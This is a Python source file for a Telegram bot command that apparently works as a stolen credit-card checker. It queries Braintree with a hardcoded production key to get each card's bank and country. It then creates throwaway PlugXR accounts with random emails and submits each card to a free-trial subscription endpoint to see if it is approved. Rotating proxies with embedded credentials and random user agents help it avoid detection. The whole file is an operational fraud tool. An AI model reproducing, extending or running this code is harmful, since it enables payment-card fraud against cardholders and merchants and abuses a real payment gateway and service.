import requests
import random
import uuid
import logging
import re
import json
import time
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [2104057670, 6827670598, 6490359522, 985410451, 7002368713, 1650751589]

# Proxy configuration
proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
    # Add more proxy credentials if available
]
proxy_base = 'p.webshare.io:80'
proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

# User agents list
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
]

# Braintree API headers
braintree_headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer production_7bbkkybf_h459dp5mgcbywsdx',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
}

# PlugXR API constants
DOMAINS = ('gmail.com', 'yahoo.com', 'outlook.com')
BASE_HEADERS = {
    'accept': '*/*',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.plugxr.com',
    'referer': 'https://www.plugxr.com/',
}
SIGNUP_URL = 'https://creatorapi.plugxr.com/api/auth/signUp'
SUBSCRIBE_URL = 'https://creatorapi.plugxr.com/api/Pricing/FreeTrailSubscription'
SIGNUP_DATA = {
    'terms_conditions': 'true',
    'password': 'vfvxvxddzsvNysy61?'
}
SUBSCRIPTION_BASE = {
    'plan_code': 'PXR-INDIVIDUAL-PLAN-ONE-SOUTH-ASIA',
    'subscription_type': 'subscription_trail',
    'billing_period': 'yearly',
    'billing_first_name': 'null',
    'billing_last_name': 'null',
    'billing_organisation': 'null',
    'billing_landmark': 'New York',
    'billing_city': 'New York',
    'billing_state': 'New York',
    'billing_pin': '10040',
    'billing_country': 'United States',
    'billing_phone': 'null',
    'card_name': 'Mohammed Nehal',
    'payment_method': 'card'
}

def get_bin_info(card_number, card_month, card_year, card_cvv):
    """Get BIN information from Braintree API"""
    try:
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': card_month,
                        'expirationYear': f"20{card_year}",
                        'cvv': card_cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=braintree_headers, json=json_data)
        response.raise_for_status()
        data = response.json()

        credit_card = data.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
        bin_data = credit_card.get('binData', {})

        return {
            'bin_info': f"{credit_card.get('brandCode', 'N/A')} {'CREDIT' if bin_data.get('debit') == 'NO' else 'DEBIT'}",
            'bank': bin_data.get('issuingBank', 'N/A'),
            'country': bin_data.get('countryOfIssuance', 'N/A')
        }
    except Exception as e:
        logger.error(f"Error getting BIN info from Braintree: {str(e)}")
        return {
            'bin_info': 'N/A',
            'bank': 'N/A',
            'country': 'N/A'
        }

def create_session():
    """Create a fresh session with random proxy and user agent"""
    session = requests.Session()
    
    # Random proxy selection with fallback
    if proxies_list:
        try:
            proxy = random.choice(proxies_list)
            session.proxies.update(proxy)
            logger.debug(f"Using proxy: {proxy['http']}")
        except Exception as e:
            logger.warning(f"Proxy setup failed: {str(e)}. Proceeding without proxy.")
    else:
        logger.debug("No proxies available. Proceeding without proxy.")
    
    # Random user agent
    user_agent = random.choice(user_agents)
    session.headers.update(BASE_HEADERS)
    session.headers['user-agent'] = user_agent
    logger.debug(f"Using user agent: {user_agent}")
    
    return session

def generate_random_email():
    """Generate random email with minimal overhead."""
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    return f"{username}@{random.choice(DOMAINS)}"

async def process_card(cc_number, cc_month, cc_year, cc_cvv):
    """Process the credit card through PlugXR's payment gateway"""
    logger.debug("Starting card processing")
    try:
        s = create_session()
        
        # Step 1: Signup
        signup_data = SIGNUP_DATA.copy()
        signup_data['email'] = generate_random_email()
        logger.debug(f"Step 1: Attempting signup with email: {signup_data['email']}")
        response = s.post(SIGNUP_URL, headers=s.headers, data=signup_data)
        response.raise_for_status()
        token = response.json().get("access_token")
        if not token:
            logger.error("Step 1 failed: No access token received")
            return {'error': 'No access token received from signup'}
        logger.debug("Step 1 success")

        # Step 2: Subscribe
        headers = s.headers.copy()
        headers['authorization'] = f'Bearer {token}'
        data = SUBSCRIPTION_BASE.copy()
        data.update({
            'card_number': cc_number,
            'card_month': cc_month,
            'card_year': cc_year,
            'card_cvv': cc_cvv
        })
        logger.debug("Step 2: Submitting subscription")
        response = s.post(SUBSCRIBE_URL, headers=headers, data=data)
        response.raise_for_status()
        response_data = response.json()
        
        message = response_data.get("message", "No message")
        if "Subscription trial activated successfully." in message:
            return {
                'status': True,
                'message': 'Approved',
                'raw_response': response_data
            }
        else:
            return {
                'status': False,
                'message': message,
                'raw_response': response_data
            }

    except requests.RequestException as e:
        logger.error(f"HTTP request failed: {str(e)}")
        return {'error': f'HTTP request failed: {str(e)}'}
    except ValueError as e:
        logger.error(f"JSON decode error: {str(e)}")
        return {'error': f'JSON decode error: {str(e)}'}
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return {'error': f'Unexpected error: {str(e)}'}

async def check_card_handler(event):
    """Handle the /chk command from Telegram"""
    if event.sender_id not in AUTHORIZED_USERS:
        await event.respond("❌ **Error**: Unauthorized user. Access denied.")
        return
    
    logger.debug("Received /chk command")
    start_time = time.time()
    
    # Extract input using regex
    input_text = event.pattern_match.group(1)
    pattern = r'^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3})$'
    match = re.match(pattern, input_text)
    
    if not match:
        logger.warning(f"Invalid input format: {input_text}")
        await event.reply("Invalid input format. Use: /chk cc|mm|yy|cvv\nExample: /chk 4207670303764172|02|29|082")
        return
    
    cc_number, cc_month, cc_year, cc_cvv = match.groups()
    
    # Normalize month to 2-digit
    cc_month = cc_month.zfill(2)
    
    # Normalize year to 2-digit
    if len(cc_year) == 4:
        cc_year = cc_year[-2:]

    logger.debug(f"Normalized input: {cc_number}|{cc_month}|{cc_year}|{cc_cvv}")

    # Get BIN info using Braintree API
    bin_info = get_bin_info(cc_number, cc_month, cc_year, cc_cvv)
    
    # Process the card
    result = await process_card(cc_number, cc_month, cc_year, cc_cvv)
    processing_time = time.time() - start_time
    
    # Format response
    if 'error' in result:
        logger.error(f"Card processing failed: {result['error']}")
        await event.reply(f"❌ **Error**: {result['error']}")
        return
    
    bold = lambda s: f"**{s}**"
    arrow = "➟"
    
    if result['status']:
        response_text = f"✅ {bold('Approved')}\n\n"
        response_text += f"{bold('Card')} {arrow} {cc_number}|{cc_month}|20{cc_year}|{cc_cvv}\n"
        response_text += f"{bold('Gateway')} {arrow} Akane Auth\n"
        response_text += f"{bold('Response')} {arrow} Approved\n\n"
    else:
        decline_message = result['message']
        response_text = f"❌ {bold('Declined')}\n\n"
        response_text += f"{bold('Card')} {arrow} {cc_number}|{cc_month}|20{cc_year}|{cc_cvv}\n"
        response_text += f"{bold('Gateway')} {arrow} Akane Auth\n"
        response_text += f"{bold('Response')} {arrow} {decline_message}\n\n"
    response_text += f"{bold('BIN')} {arrow} {bin_info['bin_info']}\n"
    response_text += f"{bold('Bank')} {arrow} {bin_info['bank']}\n"
    response_text += f"{bold('Country')} {arrow} {bin_info['country']}\n"
    response_text += f"{bold('Time')} {arrow} {processing_time:.2f}s"

    await event.reply(response_text)
